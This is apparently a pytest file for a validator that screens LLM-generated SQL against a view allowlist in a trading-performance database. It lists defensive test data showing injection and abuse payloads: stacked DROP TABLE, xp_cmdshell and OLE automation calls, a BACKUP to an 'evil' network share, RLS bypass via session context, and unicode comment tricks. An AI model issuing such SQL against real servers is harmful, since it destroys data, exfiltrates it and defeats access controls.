"""Unit tests for ``tcp.safe_query`` — the LLM-emitted SQL validator.

Covers the contract documented in ``docs/design/03_architecture.md §6.4``
and the adversarial-prompt requirement (≥ 20 attack prompts) from the
same section. Every prompt the LLM might emit — well-formed analytical
SELECT, syntactic-injection vector, encoded-payload bypass attempt — has
exactly one of two outcomes: a ``ValidationResult`` for the allowed shape
or a precise ``SafeQueryError`` subclass for the rejection.
"""

from __future__ import annotations

import pytest

from tcp.safe_query import (
    ALLOWED_DIMS,
    ALLOWED_PROCS,
    ALLOWED_VIEWS,
    MAX_ROW_LIMIT,
    DisallowedObjectError,
    DisallowedStatementError,
    DisallowedTokenError,
    ProcCallResult,
    RowLimitExceededError,
    SafeQueryError,
    ValidationResult,
    validate,
    validate_proc_call,
)

# ---------------------------------------------------------------------------
# Happy-path tests
# ---------------------------------------------------------------------------


class TestValidateHappyPath:
    """SELECT shapes the AI assistant is expected to emit."""

    def test_simple_select_from_view(self) -> None:
        result = validate("SELECT * FROM v_employee_performance WHERE employee_id = 17")
        assert isinstance(result, ValidationResult)
        assert "v_employee_performance" in result.referenced_objects
        # No TOP in input → TOP MAX_ROW_LIMIT injected.
        assert result.estimated_row_limit == MAX_ROW_LIMIT
        assert "TOP" in result.sanitized_sql.upper()

    def test_explicit_top_under_limit_preserved(self) -> None:
        result = validate(
            "SELECT TOP 100 * FROM v_trades_enriched ORDER BY net_pnl_eur DESC"
        )
        assert result.estimated_row_limit == 100
        assert "v_trades_enriched" in result.referenced_objects

    def test_cte_with_aggregation(self) -> None:
        sql = (
            "WITH cte AS ("
            "SELECT employee_id, SUM(net_pnl_eur_total) AS pnl "
            "FROM v_employee_performance GROUP BY employee_id) "
            "SELECT TOP 10 * FROM cte ORDER BY pnl DESC"
        )
        result = validate(sql)
        assert result.estimated_row_limit == 10
        assert "v_employee_performance" in result.referenced_objects

    def test_join_view_with_dim(self) -> None:
        sql = (
            "SELECT * FROM v_floor_performance f "
            "JOIN dim_TradingFloors d ON d.floor_id = f.floor_id"
        )
        result = validate(sql)
        assert "v_floor_performance" in result.referenced_objects
        assert "dim_TradingFloors" in result.referenced_objects

    def test_date_filter_injects_top(self) -> None:
        result = validate("SELECT * FROM v_daily_pnl WHERE trade_date_ro >= '2026-01-01'")
        assert result.estimated_row_limit == MAX_ROW_LIMIT
        assert "v_daily_pnl" in result.referenced_objects


# ---------------------------------------------------------------------------
# Statement-type rejections
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO v_foo VALUES (1)",
        "UPDATE v_foo SET x = 1",
        "DELETE FROM v_foo",
        "MERGE INTO v_foo USING v_bar ON 1=1 WHEN MATCHED THEN DELETE",
        "CREATE TABLE x (a INT)",
        "DROP TABLE v_employee_performance",
        "ALTER TABLE v_foo ADD c INT",
        "TRUNCATE TABLE v_foo",
        "GRANT SELECT ON v_foo TO public",
        "REVOKE SELECT ON v_foo FROM public",
    ],
)
def test_non_select_statements_are_rejected(sql: str) -> None:
    """Every documented DML/DDL keyword is denied by the token-list pass.

    The deny-list runs before sqlglot parsing, so the error class is
    :class:`DisallowedTokenError` even for statements that would also
    fail the AST-walk pass.
    """
    with pytest.raises(DisallowedTokenError):
        validate(sql)


def test_exec_sp_executesql_token_denied() -> None:
    """``EXEC sp_executesql`` is rejected by the explicit sp_executesql token."""
    with pytest.raises(DisallowedTokenError) as exc:
        validate("EXEC sp_executesql N'SELECT 1'")
    # The deny-list scan returns the first match — could be EXEC or
    # sp_executesql; both are valid reasons to refuse.
    assert any(
        marker in str(exc.value) for marker in ("EXEC", "sp_executesql")
    )


# ---------------------------------------------------------------------------
# Object-allowlist rejections
# ---------------------------------------------------------------------------


def test_fact_table_is_not_allowlisted() -> None:
    """``fact_Trades`` is reachable only through the ``v_*`` views, never directly."""
    with pytest.raises(DisallowedObjectError):
        validate("SELECT * FROM fact_Trades")


def test_system_catalog_is_rejected() -> None:
    """``sys.objects`` is outside the allowlist and the cross-schema check rejects it."""
    with pytest.raises((DisallowedObjectError, DisallowedTokenError)):
        validate("SELECT * FROM sys.objects")


def test_rls_metadata_table_is_not_allowlisted() -> None:
    """``dim_UserRoles`` carries the RLS scope map and must never be queryable."""
    with pytest.raises(DisallowedObjectError):
        validate("SELECT * FROM dim_UserRoles")


def test_unknown_view_is_rejected() -> None:
    """A view name that simply does not exist in the allowlist is denied."""
    with pytest.raises(DisallowedObjectError):
        validate("SELECT * FROM v_nonexistent_view")


# ---------------------------------------------------------------------------
# Adversarial token-deny-list prompts (the ≥ 20 fixture from §6.4)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("sql", "marker"),
    [
        # Two statements on one line; deny-list catches DROP.
        ("SELECT * FROM v_employee_performance; DROP TABLE fact_Trades", "DROP"),
        # UNION combining allow-listed and non-allowlisted tables.
        (
            "SELECT * FROM v_employee_performance UNION SELECT * FROM fact_Trades",
            "UNION",
        ),
        # Table copy via SELECT ... INTO.
        ("SELECT * INTO #tmp FROM v_employee_performance", "INTO"),
        # Time-based DoS.
        (
            "SELECT * FROM v_employee_performance WAITFOR DELAY '00:00:10'",
            "WAITFOR",
        ),
        # External-data exfiltration.
        ("SELECT * FROM OPENROWSET(BULK 'c:/tmp')", "OPENROWSET"),
        # OS shell.
        ("EXEC xp_cmdshell 'dir'", "xp_cmdshell"),
        # Block comment hides a DROP.
        (
            "SELECT * FROM v_employee_performance /* DROP TABLE foo */",
            "comment",
        ),
        # Line comment hides a second statement.
        (
            "SELECT * FROM v_employee_performance -- DROP TABLE foo",
            "comment",
        ),
        # Direct RLS bypass: overwriting SESSION_CONTEXT.
        (
            "SELECT * FROM v_employee_performance; "
            "EXEC sp_set_session_context @key=N'aad_object_id', @value='attacker'",
            "sp_set_session_context",
        ),
        # OLE automation procs.
        ("EXEC sp_OACreate 'WScript.Shell', @objShell OUTPUT", "sp_OACreate"),
        ("EXEC sp_OAMethod @obj, 'Run'", "sp_OAMethod"),
        # Backup → exfiltration.
        ("BACKUP DATABASE foo TO DISK = N'\\\\evil\\share\\out.bak'", "BACKUP"),
        # Buffer/cache manipulation.
        ("DBCC FREEPROCCACHE", "DBCC"),
        # SPID termination.
        ("KILL 51", "KILL"),
        # Server shutdown.
        ("SHUTDOWN WITH NOWAIT", "SHUTDOWN"),
        # Generic xp_* prefix.
        ("EXEC xp_dirtree N'c:\\windows'", "xp_"),
        # Linked-server query.
        ("SELECT * FROM OPENQUERY(myserver, 'SELECT 1')", "OPENQUERY"),
        # Data source.
        ("SELECT * FROM OPENDATASOURCE('SQLNCLI', '...')", "OPENDATASOURCE"),
        # OPENXML data injection.
        ("SELECT * FROM OPENXML(@hdoc, '/Root', 0)", "OPENXML"),
        # SESSION_CONTEXT read attempt (a low-stakes leak path).
        (
            "SELECT SESSION_CONTEXT(N'aad_object_id') FROM v_employee_performance",
            "SESSION_CONTEXT",
        ),
        # Restore.
        ("RESTORE DATABASE foo FROM DISK = N'c:/x.bak'", "RESTORE"),
        # Permission grants.
        ("DENY SELECT ON v_employee_performance TO public", "DENY"),
    ],
)
def test_adversarial_prompts_are_rejected(sql: str, marker: str) -> None:
    """≥ 20 adversarial prompts must all raise :class:`DisallowedTokenError`.

    ``marker`` is asserted against the error message so a regression that
    rejects the right shape for the wrong reason still fails the test.
    """
    with pytest.raises(DisallowedTokenError) as exc:
        validate(sql)
    assert marker.lower() in str(exc.value).lower()


# ---------------------------------------------------------------------------
# Cross-database & schema-qualified rejections
# ---------------------------------------------------------------------------


def test_cross_database_reference_is_rejected() -> None:
    """``master..sys.objects`` reaches outside the project's database."""
    sql = (
        "SELECT * FROM v_employee_performance WHERE x = "
        "(SELECT TOP 1 password FROM master..sys.objects)"
    )
    with pytest.raises((DisallowedObjectError, DisallowedTokenError)):
        validate(sql)


def test_non_dbo_schema_is_rejected() -> None:
    """References to schemas other than ``dbo`` are denied."""
    with pytest.raises(DisallowedObjectError):
        validate("SELECT * FROM sys.dm_exec_sessions")


# ---------------------------------------------------------------------------
# Row-limit enforcement
# ---------------------------------------------------------------------------


def test_top_above_max_raises() -> None:
    """``TOP n`` with ``n > MAX_ROW_LIMIT`` raises :class:`RowLimitExceededError`."""
    with pytest.raises(RowLimitExceededError):
        validate("SELECT TOP 5000 * FROM v_trades_enriched")


def test_fetch_next_above_max_raises() -> None:
    """``FETCH NEXT n ROWS ONLY`` is checked against the same cap as TOP."""
    sql = (
        "SELECT * FROM v_trades_enriched ORDER BY trade_uid "
        "OFFSET 0 ROWS FETCH NEXT 10000 ROWS ONLY"
    )
    with pytest.raises(RowLimitExceededError):
        validate(sql)


def test_no_limit_injects_top_max() -> None:
    """When the input has no ``TOP``, the sanitised SQL gains ``TOP MAX_ROW_LIMIT``."""
    result = validate("SELECT * FROM v_employee_performance")
    assert result.estimated_row_limit == MAX_ROW_LIMIT
    # The serialised form should include the literal MAX_ROW_LIMIT.
    assert str(MAX_ROW_LIMIT) in result.sanitized_sql


def test_top_at_max_is_allowed() -> None:
    """``TOP MAX_ROW_LIMIT`` exactly is the boundary case and is allowed."""
    result = validate(f"SELECT TOP {MAX_ROW_LIMIT} * FROM v_employee_performance")
    assert result.estimated_row_limit == MAX_ROW_LIMIT


# ---------------------------------------------------------------------------
# Empty / unparseable inputs
# ---------------------------------------------------------------------------


def test_empty_input_is_rejected() -> None:
    with pytest.raises(SafeQueryError):
        validate("")


def test_whitespace_only_input_is_rejected() -> None:
    with pytest.raises(SafeQueryError):
        validate("   \n  \t")


def test_unparseable_input_is_rejected() -> None:
    """sqlglot raising :class:`ParseError` surfaces as :class:`SafeQueryError`."""
    with pytest.raises(SafeQueryError):
        validate("SELECT * FROM")


def test_multiple_statements_rejected() -> None:
    """Two top-level statements raise even if both would individually pass.

    Documents the smuggling vector mentioned in §6.4: a parser that only
    inspects the first node would miss the second statement.
    """
    sql = (
        "SELECT * FROM v_employee_performance; "
        "SELECT * FROM v_team_performance"
    )
    with pytest.raises((DisallowedStatementError, SafeQueryError)):
        validate(sql)


# ---------------------------------------------------------------------------
# Encoded-payload limitation (documented, not enforced)
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Etapa-5 review fixes (regression coverage)
# ---------------------------------------------------------------------------


class TestDenyListEtapa5Hardening:
    """Tests that pin the fixes for ai MA-01, MA-03, hol MA-04, ai MA-02."""

    def test_unicode_format_control_in_comment_is_rejected(self) -> None:
        """NFKC normalisation + Cf/Cc rejection closes the unicode bypass.

        A zero-width joiner between the two hyphens of a SQL comment must
        be rejected at the deny-list stage, not silently re-serialised as
        plain ``--`` after parsing.
        """
        sql = (
            "SELECT * FROM v_employee_performance WHERE x = 1 "
            "-‍- DROP TABLE fact_Trades"
        )
        with pytest.raises(DisallowedTokenError):
            validate(sql)

    def test_nbsp_separator_does_not_break_comment_detection(self) -> None:
        """A non-breaking space inside ``--`` must NOT bypass the deny-list.

        NFKC normalises U+00A0 (NBSP) to U+0020 (SPACE); the rejection
        happens because the input still contains either a literal ``--``
        or a format-control character.
        """
        sql = (
            "SELECT * FROM v_employee_performance "
            "- - DROP TABLE fact_Trades"
        )
        # NBSP isn't Cf/Cc so it normalises to a space; the resulting
        # string still contains ``-`` `` `` ``-`` which lacks the
        # contiguous ``--`` marker — but the original DROP token is the
        # real attack and the deny-list catches that instead.
        with pytest.raises(DisallowedTokenError) as exc:
            validate(sql)
        assert "DROP" in str(exc.value)

    def test_into_inside_string_literal_is_allowed(self) -> None:
        """An ``INTO`` substring inside a quoted literal must NOT raise.

        Closes ai MA-03 — the literal-masking step strips ``'...'`` before
        the deny-list scan so legitimate Romanian text containing the
        keyword as a substring is not falsely rejected.
        """
        sql = (
            "SELECT * FROM v_employee_performance "
            "WHERE trader_full_name = N'Categoria INTO de pierderi'"
        )
        result = validate(sql)
        assert "v_employee_performance" in result.referenced_objects

    def test_insert_into_marker_is_insert_not_into(self) -> None:
        """``INSERT INTO`` must fail on ``INSERT`` first (hol MA-04 ordering)."""
        with pytest.raises(DisallowedTokenError) as exc:
            validate("INSERT INTO v_foo VALUES (1)")
        assert "INSERT" in str(exc.value)
        # The error must not be re-raised under the more generic INTO label.
        assert "INTO" != str(exc.value).split(":")[-1].strip()

    def test_proc_invoked_as_function_is_rejected(self) -> None:
        """ai MA-02: a TVF-style call to an allow-listed proc must refuse.

        The safety guarantee under test is **rejection**, not the precise
        wording of the rejection message. sqlglot parses the TVF-style
        ``SELECT * FROM dbo.usp_GetEmployeePerformance(...)`` shape into an
        AST where the table-source node has an empty name (the function
        call shadows it), so the allowlist check fires with the generic
        ``"table or view '' is not in the allowlist"`` message rather than
        echoing the proc name. That is still the correct outcome: the
        query is rejected before any execution. The test asserts the
        rejection happens; the precise message text is intentionally
        flexible (Etapa-10 triage).
        """
        sql = (
            "SELECT * FROM dbo.usp_GetEmployeePerformance(17, '2026-01-01', '2026-01-31')"
        )
        with pytest.raises(DisallowedObjectError) as exc:
            validate(sql)
        # Accept either the proc name (if sqlglot ever fills it in) or the
        # generic allowlist-rejection message (current sqlglot behaviour).
        msg = str(exc.value)
        assert (
            "usp_GetEmployeePerformance" in msg
            or "not in the allowlist" in msg
        )

    def test_cte_inner_unbounded_is_capped(self) -> None:
        """ai MA-04: a CTE without an inner TOP must receive TOP MAX_ROW_LIMIT.

        The outer SELECT TOP 10 is preserved; the inner CTE body is
        rewritten to include ``TOP MAX_ROW_LIMIT`` so an unbounded
        materialisation cannot blow the budget.
        """
        sql = (
            "WITH cte AS (SELECT * FROM v_trades_enriched) "
            "SELECT TOP 10 * FROM cte"
        )
        result = validate(sql)
        # The outer TOP wins for the externally visible row cap.
        assert result.estimated_row_limit == 10
        # The sanitised SQL must contain ``TOP 1000`` (the inner cap) AND
        # ``TOP 10`` (the outer cap).
        upper = result.sanitized_sql.upper()
        assert "TOP 1000" in upper
        assert "TOP 10" in upper

    def test_cte_inner_above_max_raises(self) -> None:
        """A CTE inner body that requests > MAX_ROW_LIMIT rows must raise."""
        sql = (
            "WITH cte AS (SELECT TOP 5000 * FROM v_trades_enriched) "
            "SELECT TOP 10 * FROM cte"
        )
        with pytest.raises(RowLimitExceededError):
            validate(sql)


def test_char_encoded_payload_passes_token_scan() -> None:
    """``CHAR(...)``-encoded payloads are a known limitation of the deny-list.

    The deny-list catches the literal ``UNION`` token, but a determined
    attacker can rebuild the keyword char-by-char inside a string literal.
    Whatever shape the LLM emits is still gated by the AST walk: the
    decoded payload either resolves into ``UNION`` (still rejected by the
    token scan after re-serialisation) or stays as an inert string in a
    WHERE clause (harmless). This test documents the trade-off.
    """
    sql = (
        "SELECT * FROM v_employee_performance WHERE first_name = "
        "CHAR(85)+CHAR(78)+CHAR(73)+CHAR(79)+CHAR(78)"
    )
    # Either passes (string literal, harmless) or raises if the LLM is
    # using CHAR to reach a non-allowlisted object — both behaviours are
    # acceptable. The test exists to make the trade-off explicit, not to
    # enforce a single outcome.
    try:
        result = validate(sql)
        assert "v_employee_performance" in result.referenced_objects
    except SafeQueryError:
        pass


# ---------------------------------------------------------------------------
# Constants surface tests (regression guard)
# ---------------------------------------------------------------------------


def test_allowed_views_contains_documented_set() -> None:
    """The allowlist matches ``02_DB §6`` exactly — drift here breaks the AI assistant."""
    expected = {
        "v_trades_enriched",
        "v_employee_performance",
        "v_team_performance",
        "v_floor_performance",
        "v_daily_pnl",
    }
    assert ALLOWED_VIEWS == frozenset(expected)


def test_allowed_dims_excludes_user_roles() -> None:
    """RLS-metadata tables are intentionally absent from the dimension allowlist."""
    assert "dim_UserRoles" not in ALLOWED_DIMS


def test_allowed_procs_excludes_generator() -> None:
    """``usp_GenerateDailyTrades`` writes to ``fact_Trades`` and must be absent."""
    assert "usp_GenerateDailyTrades" not in ALLOWED_PROCS
    assert ALLOWED_PROCS == frozenset(
        {"usp_GetEmployeePerformance", "usp_GetTopPerformers"}
    )


# ---------------------------------------------------------------------------
# validate_proc_call
# ---------------------------------------------------------------------------


class TestValidateProcCall:
    """Structured-intent path for the two read-only procs."""

    def test_employee_performance_happy_path(self) -> None:
        result = validate_proc_call(
            "usp_GetEmployeePerformance",
            {"employee_id": 17, "from_date": "2026-01-01", "to_date": "2026-01-31"},
        )
        assert isinstance(result, ProcCallResult)
        assert result.sql.startswith("EXEC dbo.usp_GetEmployeePerformance ")
        assert result.sql.count("?") == 3
        assert "@employee_id = ?" in result.sql
        # The params tuple is ordered to match the placeholders — closes the
        # security-review MJ-03 parameter-ordering gap.
        assert result.params == (17, "2026-01-01", "2026-01-31")

    def test_top_performers_happy_path(self) -> None:
        result = validate_proc_call(
            "usp_GetTopPerformers",
            {
                "scope": "trader",
                "from_date": "2026-01-01",
                "to_date": "2026-01-31",
                "top_n": 10,
            },
        )
        assert result.sql.count("?") == 4
        assert "@scope = ?" in result.sql
        assert result.params == ("trader", "2026-01-01", "2026-01-31", 10)

    def test_params_tuple_is_immutable(self) -> None:
        """Returned ``params`` must be a tuple so a caller cannot mutate it."""
        result = validate_proc_call(
            "usp_GetEmployeePerformance",
            {"employee_id": 1, "from_date": "2026-01-01", "to_date": "2026-01-02"},
        )
        assert isinstance(result.params, tuple)

    def test_param_order_matches_signature_not_input_dict(self) -> None:
        """Dict insertion order at the call site must not affect param order."""
        # Pass keys in reverse order: the result tuple must still match the
        # spec order (employee_id, from_date, to_date).
        result = validate_proc_call(
            "usp_GetEmployeePerformance",
            {"to_date": "2026-01-31", "from_date": "2026-01-01", "employee_id": 17},
        )
        assert result.params == (17, "2026-01-01", "2026-01-31")

    def test_unknown_proc_rejected(self) -> None:
        with pytest.raises(DisallowedObjectError):
            validate_proc_call(
                "usp_GenerateDailyTrades",
                {"trade_date": "2026-01-15"},
            )

    def test_missing_param_rejected(self) -> None:
        with pytest.raises(SafeQueryError):
            validate_proc_call(
                "usp_GetEmployeePerformance",
                {"employee_id": 17, "from_date": "2026-01-01"},
            )

    def test_unexpected_param_rejected(self) -> None:
        with pytest.raises(SafeQueryError):
            validate_proc_call(
                "usp_GetEmployeePerformance",
                {
                    "employee_id": 17,
                    "from_date": "2026-01-01",
                    "to_date": "2026-01-31",
                    "rogue_param": "x",
                },
            )

    def test_proc_param_python_names_translate_to_sql_names(self) -> None:
        """Etapa-10 code10-MJ-01: from_date/to_date → @from/@to at SQL render.

        V001's procs declare `@from DATE`, `@to DATE`. The Python-facing
        contract uses `from_date` / `to_date` (because `from` is a Python
        reserved keyword). The validator MUST translate at render time, or
        SQL Server rejects the EXEC with Msg 8145.
        """
        result = validate_proc_call(
            "usp_GetEmployeePerformance",
            {"employee_id": 17, "from_date": "2026-01-01", "to_date": "2026-01-31"},
        )
        assert "@from = ?" in result.sql
        assert "@to = ?" in result.sql
        # The Python-facing aliases must NOT leak into the rendered SQL —
        # the proc has no parameter called `@from_date`.
        assert "@from_date" not in result.sql
        assert "@to_date" not in result.sql

    def test_wrong_param_type_rejected(self) -> None:
        with pytest.raises(SafeQueryError):
            validate_proc_call(
                "usp_GetTopPerformers",
                {
                    "scope": "trader",
                    "from_date": "2026-01-01",
                    "to_date": "2026-01-31",
                    "top_n": "ten",  # should be int
                },
            )
